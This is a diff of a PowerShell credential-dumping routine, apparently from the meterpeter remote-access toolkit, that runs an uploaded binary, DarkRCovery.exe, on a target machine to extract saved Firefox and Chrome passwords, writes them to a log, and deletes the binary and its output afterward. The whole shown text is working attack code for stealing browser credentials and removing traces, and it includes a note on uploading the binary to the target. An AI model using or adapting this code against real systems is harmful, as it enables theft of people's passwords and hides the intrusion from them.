@@ -856,32 +856,35 @@ function CREDS_DUMP {
         $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
     }
 
-    ## Leak Firefox|Chrome creds (By 0xyg3n)
-    If(Test-Path "$env:tmp\DarkRCovery.exe"){
+    ## Leak Firefox|Chrome credntials { EXE Coded By 0xyg3n }
+    # DarkRCovery requires to be uploaded to $env:TMP { client working dir }
+    If(Test-Path "$env:TMP\DarkRCovery.exe"){
         echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-        cd $env:tmp;& "$env:tmp\DarkRCovery.exe"
-        Start-Sleep -Seconds 8 # Wait for DarkRCovery to finish ..
-        If(Test-Path "$env:tmp\Leaked.txt"){
-            $StoreCreds = Get-Content "$env:tmp\Leaked.txt" -ErrorAction SilentlyContinue
-            ## Check powershell version to parse data
+        cd $env:TMP;Start-Process "$env:TMP\DarkRCovery.exe" -Wait # Wait for DarkRCovery.exe to finish ..
+        If(Test-Path "$env:TMP\Leaked.txt"){
+            $StoreCreds = Get-Content "$env:TMP\Leaked.txt" -ErrorAction SilentlyContinue
+            ## Check for powershell version [5] to Parse Data
             $PSVersion = $PSVersionTable.PSVersion.Major
             If($PSVersion -gt '4'){
+                ## Remove from output what i dont like
                 $ParseData = $StoreCreds|Select -Skip 1|Select -SkipLast 2
+                $RawCredentials = $ParseData -replace 'url:','hostname:' -replace '\[PASSWORD\]',''
+                 #|Where-Object {-not[string]::IsNullOrEmpty(([string]$_).trim())} # remove all brake lines
             }else{
-                $ParseData = $StoreCreds
+                $RawCredentials = $StoreCreds
             }
             ## Remove logfile and the binary uploaded
-            Remove-Item "$env:tmp\Leaked.txt" -Force
-            Remove-Item "$env:tmp\DarkRCovery.exe" -Force
-            echo $ParseData >> $LogFilePath\BrowserEnum.log
+            Remove-Item -Path "$env:TMP\Leaked.txt" -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path "$env:TMP\DarkRCovery.exe" -Force -ErrorAction SilentlyContinue
+            echo $RawCredentials >> $LogFilePath\BrowserEnum.log
             cd $IPATH
         }else{
-            echo "[ Not found: `$env:tmp\Leaked.txt ]" >> $LogFilePath\BrowserEnum.log
+            echo "[ Not found: `$env:TMP\Leaked.txt ]" >> $LogFilePath\BrowserEnum.log
             cd $IPATH
         }
     }else{
         echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-        echo "{Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
+        echo "{Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:TMP}" >> $LogFilePath\BrowserEnum.log
         echo "{And Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak firefox|chrome credentials}" >> $LogFilePath\BrowserEnum.log
         echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe}" >> $LogFilePath\BrowserEnum.log
     }
